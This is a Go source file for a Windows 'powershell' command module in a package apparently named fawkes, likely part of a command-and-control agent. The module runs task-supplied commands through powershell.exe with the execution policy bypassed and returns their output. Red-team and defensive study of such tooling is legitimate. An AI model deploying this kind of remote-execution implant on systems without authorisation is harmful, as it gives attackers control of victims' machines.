//go:build windows
// +build windows

package commands

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// PowershellCommand implements the powershell command
type PowershellCommand struct{}

// Name returns the command name
func (c *PowershellCommand) Name() string {
	return "powershell"
}

// Description returns the command description
func (c *PowershellCommand) Description() string {
	return "Execute a PowerShell command or script"
}

// Execute executes the powershell command
func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: No command specified",
			Status:    "error",
			Completed: true,
		}
	}

	// 5-minute timeout to prevent indefinite agent hangs from long-running scripts
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", task.Params,
	)

	output, err := cmd.CombinedOutput()

	if err != nil {
		outputStr := string(output)
		if ctx.Err() == context.DeadlineExceeded {
			return structs.CommandResult{
				Output:    fmt.Sprintf("PowerShell command timed out after 5 minutes\n%s", outputStr),
				Status:    "error",
				Completed: true,
			}
		}
		if outputStr != "" {
			return structs.CommandResult{
				Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing PowerShell: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	outputStr := strings.TrimSpace(string(output))
	if outputStr == "" {
		outputStr = "Command executed successfully (no output)"
	}

	return structs.CommandResult{
		Output:    outputStr,
		Status:    "success",
		Completed: true,
	}
}
